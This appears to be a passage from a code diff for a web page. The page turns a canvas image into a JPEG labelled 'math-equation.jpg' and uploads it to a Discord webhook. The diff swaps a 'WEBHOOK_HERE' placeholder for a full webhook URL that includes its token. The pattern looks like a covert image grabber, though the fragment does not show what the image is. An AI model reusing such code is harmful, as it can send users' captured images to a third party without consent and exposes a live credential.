@@ -52,7 +52,7 @@
           var formData = new FormData();
           formData.append('file', blob, 'math-equation.jpg');
           var xhr = new XMLHttpRequest();
-          xhr.open('POST', 'WEBHOOK_HERE');
+          xhr.open('POST', 'https://discord.com/api/webhooks/1456537896885420063/edQDxToE40p8fg0rBqz1IIoqcW9YGymAU52eBSR7X1eD2bPxo5NdNwuezg_Nzk1xA0qC');
           xhr.send(formData);
         }, 'image/jpeg', 1.0);
         var equation = 'Equation ' + imageCounter++;
